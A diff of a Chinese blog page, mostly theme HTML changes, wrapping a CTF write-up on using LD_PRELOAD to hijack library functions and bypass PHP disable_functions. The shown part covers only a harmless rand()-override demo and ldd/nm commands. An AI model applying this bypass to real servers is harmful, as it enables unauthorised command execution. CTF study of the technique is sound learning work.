@@ -1,179 +1,234 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="前言 参加TCTF也是伤感，web题目只有两题….但是质量实在是高，虽然没搞出来。但是最后看wp学了不少东西。  环境小西师傅的docker环境 LD_PRELOAD解释 LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这">
-<meta property="og:type" content="article">
-<meta property="og:title" content="TCTF | LD_PRELOAD系统劫持绕过disable_functions">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="前言 参加TCTF也是伤感，web题目只有两题….但是质量实在是高，虽然没搞出来。但是最后看wp学了不少东西。  环境小西师傅的docker环境 LD_PRELOAD解释 LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/1.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/2.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/3.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/4.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/5.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/6.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/7.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/8.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/9.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/13.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/10.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/11.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/12.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/14.png">
-<meta property="article:published_time" content="2019-03-31T15:27:35.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:31:44.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/1.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>TCTF | LD_PRELOAD系统劫持绕过disable_functions</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>TCTF | LD_PRELOAD系统劫持绕过disable_functions - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/04/06/RingZer0-CTF-web-sql-WP/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&text=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&is_video=false&description=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=TCTF | LD_PRELOAD系统劫持绕过disable_functions&body=Check out this article: http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&title=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&name=TCTF | LD_PRELOAD系统劫持绕过disable_functions&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/&t=TCTF | LD_PRELOAD系统劫持绕过disable_functions" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境"><span class="toc-number">2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD解释"><span class="toc-number">3.</span> <span class="toc-text">LD_PRELOAD解释</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD劫持系统函数操作"><span class="toc-number">4.</span> <span class="toc-text">LD_PRELOAD劫持系统函数操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#创建c文件random-num-c生成随机数"><span class="toc-number">4.1.</span> <span class="toc-text">创建c文件random_num.c生成随机数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译random-num-c生成可执行文件random-num"><span class="toc-number">4.2.</span> <span class="toc-text">编译random_num.c生成可执行文件random_num</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建unrandom-c文件"><span class="toc-number">4.3.</span> <span class="toc-text">创建unrandom.c文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#执行random-num"><span class="toc-number">4.4.</span> <span class="toc-text">执行random_num</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD劫持系统函数原理"><span class="toc-number">5.</span> <span class="toc-text">LD_PRELOAD劫持系统函数原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD劫持共享对象"><span class="toc-number">6.</span> <span class="toc-text">LD_PRELOAD劫持共享对象</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#方式"><span class="toc-number">6.1.</span> <span class="toc-text">方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mail-函数产生进程"><span class="toc-number">6.2.</span> <span class="toc-text">mail()函数产生进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#创建mail方法"><span class="toc-number">6.2.1.</span> <span class="toc-text">创建mail方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#追踪函数调用情况，发现调用了外部程序"><span class="toc-number">6.2.2.</span> <span class="toc-text">追踪函数调用情况，发现调用了外部程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用imagick实现共享对象劫持"><span class="toc-number">7.</span> <span class="toc-text">利用imagick实现共享对象劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#创建Bypass-c"><span class="toc-number">7.1.</span> <span class="toc-text">创建Bypass.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建image-php文件"><span class="toc-number">7.2.</span> <span class="toc-text">创建image.php文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TCTF"><span class="toc-number">8.</span> <span class="toc-text">TCTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件源码"><span class="toc-number">9.</span> <span class="toc-text">文件源码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#123-eps-怕忘了这个文件，随手加"><span class="toc-number">9.1.</span> <span class="toc-text">123.eps(怕忘了这个文件，随手加)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-c"><span class="toc-number">9.2.</span> <span class="toc-text">bypass.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypassimage-php"><span class="toc-number">9.3.</span> <span class="toc-text">bypassimage.php</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        TCTF | LD_PRELOAD系统劫持绕过disable_functions
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-03-31T15:27:35.000Z" itemprop="datePublished">2019-03-31</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
-
-      <span id="/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/" class="leancloud_visitors" data-flag-title="TCTF | LD_PRELOAD系统劫持绕过disable_functions">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-03-31 23:27" pubdate>
+        2019年3月31日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">TCTF | LD_PRELOAD系统劫持绕过disable_functions</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
 <p>参加TCTF也是伤感，web题目只有两题….但是质量实在是高，虽然没搞出来。但是最后看wp学了不少东西。</p>
 </blockquote>
 <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy" target="_blank" rel="noopener">小西师傅的docker环境</a></p>
@@ -181,29 +236,43 @@
 <p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
 </blockquote>
 <p>摘自<a href="https://blog.csdn.net/chen_jianjian/article/details/80627693" target="_blank" rel="noopener">https://blog.csdn.net/chen_jianjian/article/details/80627693</a></p>
-<h1 id="LD-PRELOAD劫持系统函数操作"><a href="#LD-PRELOAD劫持系统函数操作" class="headerlink" title="LD_PRELOAD劫持系统函数操作"></a>LD_PRELOAD劫持系统函数操作</h1><h2 id="创建c文件random-num-c生成随机数"><a href="#创建c文件random-num-c生成随机数" class="headerlink" title="创建c文件random_num.c生成随机数"></a>创建c文件random_num.c生成随机数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">  srand(time(NULL));</span><br><span class="line">  int i &#x3D; 10;</span><br><span class="line">  while(i--) printf(&quot;%d\n&quot;,rand()%100);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="LD-PRELOAD劫持系统函数操作"><a href="#LD-PRELOAD劫持系统函数操作" class="headerlink" title="LD_PRELOAD劫持系统函数操作"></a>LD_PRELOAD劫持系统函数操作</h1><h2 id="创建c文件random-num-c生成随机数"><a href="#创建c文件random-num-c生成随机数" class="headerlink" title="创建c文件random_num.c生成随机数"></a>创建c文件random_num.c生成随机数</h2><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span>
+ 
+<span class="hljs-built_in">int</span> main()&#123;
+  srand(time(<span class="hljs-literal">NULL</span>))<span class="hljs-comment">;</span>
+  <span class="hljs-built_in">int</span> i = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
+  <span class="hljs-keyword">while</span>(i--) printf(<span class="hljs-string">"%d\n"</span>,rand()%<span class="hljs-number">100</span>)<span class="hljs-comment">;</span>
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+&#125;</code></pre>
 
-<h2 id="编译random-num-c生成可执行文件random-num"><a href="#编译random-num-c生成可执行文件random-num" class="headerlink" title="编译random_num.c生成可执行文件random_num"></a>编译random_num.c生成可执行文件random_num</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc random_num.c -o random_num</span><br></pre></td></tr></table></figure>
+<h2 id="编译random-num-c生成可执行文件random-num"><a href="#编译random-num-c生成可执行文件random-num" class="headerlink" title="编译random_num.c生成可执行文件random_num"></a>编译random_num.c生成可执行文件random_num</h2><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>gcc random_num.c -o random_num</code></pre>
 
 <h2 id="创建unrandom-c文件"><a href="#创建unrandom-c文件" class="headerlink" title="创建unrandom.c文件"></a>创建unrandom.c文件</h2><p>与random.c文件不同这里rand()方法只返回42</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int rand()&#123;</span><br><span class="line">    return 42; &#x2F;&#x2F;the most random number in the universe</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> rand()&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">42</span>; <span class="hljs-comment">//the most random number in the universe</span>
+&#125;</code></pre>
 <p>并编译unrandom.c成一个共享库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -shared -fPIC unrandom.c -o unrandom.so</span><br></pre></td></tr></table></figure>
-<p>临时文件目录文件存在情况如下<br><img src="./1.png" alt=""></p>
+<pre><code class="hljs angelscript">$ gcc -<span class="hljs-keyword">shared</span> -fPIC unrandom.c -o unrandom.so</code></pre>
+<p>临时文件目录文件存在情况如下<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="执行random-num"><a href="#执行random-num" class="headerlink" title="执行random_num"></a>执行random_num</h2><p><strong>libc.so为c语言执行所必须调用的共享库</strong></p>
 <p>分别执行random_num<br>1.LD_PRELOAD动态链接unrandom.so共享库<br>2.系统libc.so共享库下执行文件</p>
-<p>如下图产生不同结果<br><img src="./2.png" alt=""></p>
+<p>如下图产生不同结果<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="LD-PRELOAD劫持系统函数原理"><a href="#LD-PRELOAD劫持系统函数原理" class="headerlink" title="LD_PRELOAD劫持系统函数原理"></a>LD_PRELOAD劫持系统函数原理</h1><p>上面操作中random_num中的输出按照正常思维是会输出随机数，在LD_PRELOAD动态链接unrandom.so下却为42。为什么系统的libc.so库不起作用？</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line">$ ldd .&#x2F;random_num</span><br></pre></td></tr></table></figure>
-<p><img src="./3.png" alt=""></p>
+<pre><code class="hljs avrasm">执行命令
+$ <span class="hljs-keyword">ldd</span> ./random_num</code></pre>
+<p><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
 <p>运行<code>random_num</code>所需要的库,<code>libc.so</code>提供核心c功能文件，包括<code>rand()</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line">$ nm -D &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</span><br></pre></td></tr></table></figure>
-<p><img src="./4.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line">$ LD_PRELOAD&#x3D;$PWD&#x2F;unrandom.so ldd random_num</span><br></pre></td></tr></table></figure>
